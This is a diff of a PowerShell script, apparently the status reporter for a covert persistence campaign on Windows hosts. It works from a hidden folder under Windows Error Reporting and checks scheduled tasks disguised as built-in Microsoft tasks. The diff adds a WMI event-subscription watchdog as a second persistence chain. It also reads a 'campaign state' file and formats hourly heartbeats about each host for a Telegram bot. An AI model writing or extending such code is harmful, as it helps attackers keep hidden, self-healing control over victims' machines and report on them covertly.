@@ -1,10 +1,13 @@
 #Requires -Version 5.1
-# TG_REPORT BUILD 20260802T6 - truncate for 4096 + deploy diagnostics
+# TG_REPORT BUILD 20260802T7 - identity-aware tasks + compact digest mode
 param(
     [Parameter(Mandatory = $true)][string]$State,
-    [Parameter(Mandatory = $true)][string]$Summary,
+    [string]$Summary = '',
     [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
-    [string]$OldState = ''
+    [string]$OldState = '',
+    [ValidateSet('rich', 'compact')][string]$Mode = 'rich',
+    [string]$Build = 'O15',
+    [string]$Count = '0'
 )
 
 $ErrorActionPreference = 'SilentlyContinue'
@@ -258,17 +261,33 @@ $etlMon = "$env:ProgramData\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"
 $hasMon = Test-Path $monPath
 $hasEtl = Test-Path $etlMon
 
+# per-host identity: expected task names come from identity.cfg when present
+$idCfg = Join-Path $WorkDir 'identity.cfg'
+$idMap = @{}
+if (Test-Path $idCfg) {
+    Get-Content -LiteralPath $idCfg | ForEach-Object {
+        if ($_ -match '^\s*([A-Z_]+)\s*=\s*(.+?)\s*$') { $idMap[$matches[1]] = $matches[2] }
+    }
+}
 $expectedTasks = @(
-    @{ Name = '\Microsoft\Windows\Diagnosis\Scheduled'; Role = 'tick 2m (own_mon)' },
-    @{ Name = '\Microsoft\Windows\PLA\Server'; Role = 'backup 3m (etl_mon)' },
-    @{ Name = '\Microsoft\Windows\WDI\ResolutionHost'; Role = 'ONSTART' },
-    @{ Name = '\Microsoft\Windows\Tcpip\IpAddressConflict1'; Role = 'ONLOGON' }
+    @{ Name = $(if ($idMap.TASK_A) { $idMap.TASK_A } else { '\Microsoft\Windows\Diagnosis\Scheduled' }); Role = "tick $($idMap.MO_A)m (chain1)" },
+    @{ Name = $(if ($idMap.TASK_B) { $idMap.TASK_B } else { '\Microsoft\Windows\PLA\Server' }); Role = "backup $($idMap.MO_B)m (chain1)" },
+    @{ Name = $(if ($idMap.TASK_C) { $idMap.TASK_C } else { '\Microsoft\Windows\WDI\ResolutionHost' }); Role = 'ONSTART (chain1)' },
+    @{ Name = $(if ($idMap.TASK_D) { $idMap.TASK_D } else { '\Microsoft\Windows\Tcpip\IpAddressConflict1' }); Role = 'ONLOGON (chain1)' }
 )
+# chain 2: WMI watchdog subscription
+$wmiC = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WucacheWatchdogC'" -ErrorAction SilentlyContinue
+$expectedTasks += @{ Name = '\WMI\WucacheWatchdogC'; Role = 'timer 3m (chain2)'; Wmi = ($null -ne $wmiC) }
 
 $taskLines = New-Object System.Collections.Generic.List[string]
 $taskOk = 0
 $taskBad = 0
 foreach ($t in $expectedTasks) {
+    if ($t.ContainsKey('Wmi')) {
+        if ($t.Wmi) { $taskOk++; $mark = 'OK' } else { $taskBad++; $mark = 'MISSING' }
+        [void]$taskLines.Add(('- [{0}] <code>{1}</code> - {2}' -f $mark, (Esc $t.Name), (Esc $t.Role)))
+        continue
+    }
     $h = Get-TaskHealth $t.Name
     if ($h.Present -and $h.Healthy) {
         $taskOk++
@@ -302,6 +321,7 @@ $emojiMap = @{
     FAIL     = [string]([char]0x274C)
     FORCE    = [string]([char]0x26A1)
     DEPLOY   = ([string][char]::ConvertFromUtf32(0x1F680))
+    HB       = ([string][char]::ConvertFromUtf32(0x1F4E1))
 }
 $key = $State.ToUpperInvariant()
 $emoji = if ($emojiMap.ContainsKey($key)) { $emojiMap[$key] } else { ([string][char]::ConvertFromUtf32(0x1F4F1)) }
@@ -313,6 +333,7 @@ $title = switch ($key) {
     'FAIL' { 'Heal FAILED' }
     'FORCE' { 'Forced reinstall' }
     'DEPLOY' { if ($deployOk) { 'FIRST DEPLOY OK' } else { 'FIRST DEPLOY - CHECK NEEDED' } }
+    'HB' { 'hourly digest' }
     default { "State: $State" }
 }
 
@@ -329,6 +350,19 @@ try {
     $boot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
     $uptime = '{0:dd}d {0:hh}h {0:mm}m' -f ((Get-Date) - $boot)
 } catch {}
+
+# campaign state file (written by own_lib.ps1 state action)
+$stateLine = 'n/a'
+$stateObj = $null
+$statePath2 = Join-Path $WorkDir 'state.json'
+if (Test-Path $statePath2) {
+    $rawState = (Get-Content -LiteralPath $statePath2 -Raw).Trim()
+    try {
+        $stateObj = $rawState | ConvertFrom-Json
+        $foreignCsv = if ($stateObj.foreign) { ($stateObj.foreign -join ',') } else { '-' }
+        $stateLine = "prim=$($stateObj.prim) alt=$($stateObj.alt) foreign=[$foreignCsv] tasks=$($stateObj.tasksOk)/$($stateObj.tasksTotal) wd=$($stateObj.watchdog) heals=$($stateObj.installCount)"
+    } catch { $stateLine = $rawState }
+}
 
 $deployBlock = ''
 if ($key -eq 'DEPLOY') {
@@ -414,8 +448,21 @@ $($taskLines -join "`n")
 - MSI cache: $(Esc $msiSize)
 - WorkDir: <code>$(Esc $WorkDir)</code>
 
-<i>Bot: @nobuddyrmmBot | TG_REPORT T6</i>
+<b>Campaign state</b>
+- <code>$(Esc $stateLine)</code>
+
+<i>Bot: @nobuddyrmmBot | TG_REPORT T7</i>
 "@
+
+# compact digest mode: one short line, HTML-free (hourly heartbeat)
+if ($Mode -eq 'compact') {
+    $foreignN = 0
+    if ($stateObj -and $stateObj.foreign) { $foreignN = @($stateObj.foreign).Count }
+    $msiShort = if (Test-Path $msiCache) { '{0:N0}KB' -f ((Get-Item $msiCache).Length / 1KB) } else { '0' }
+    $primShort = if ($primOk) { 'OK' } else { 'DOWN' }
+    $altShort = if ($altLine -like 'Running*') { 'OK' } else { '-' }
+    $text = "$emoji SCD|$($env:COMPUTERNAME)|prim=$primShort|alt=$altShort|foreign=$foreignN|tasks=$taskOk/5|msi=$msiShort|up=$uptime|b=$Build|$now"
+}
 
 if ($text.Length -gt 3800) {
     $rmmHits = @(($rmmHits | Select-Object -First 12)) + ('- ... ({0} more)' -f ($rmmHits.Count - 12))
